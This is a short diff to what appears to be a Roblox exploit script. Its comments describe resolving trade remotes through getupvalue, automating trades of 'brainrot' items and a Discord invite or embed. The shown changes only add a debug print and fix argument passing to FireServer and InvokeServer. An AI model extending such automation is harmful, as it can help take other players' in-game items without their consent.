@@ -1,3 +1,4 @@
+print("[Brainrot] ===== MAIN STARTING =====")
 -- ===================== MAIN SCRIPT (loadstring) =====================
 -- Remotes resolved via TradeController getupvalue (no hard-coded Net indexes)
 -- If no target brainrots on base at start → Discord invite GUI (no trades / no embed)
@@ -1701,11 +1702,12 @@ local function startFullAutomation()
 
 	local function fireRemote(r, ...)
 		if not r then return end
+		local args = { ... }
 		pcall(function()
 			if r:IsA("RemoteEvent") then
-				r:FireServer(...)
+				r:FireServer(table.unpack(args))
 			else
-				r:InvokeServer(...)
+				r:InvokeServer(table.unpack(args))
 			end
 		end)
 	end
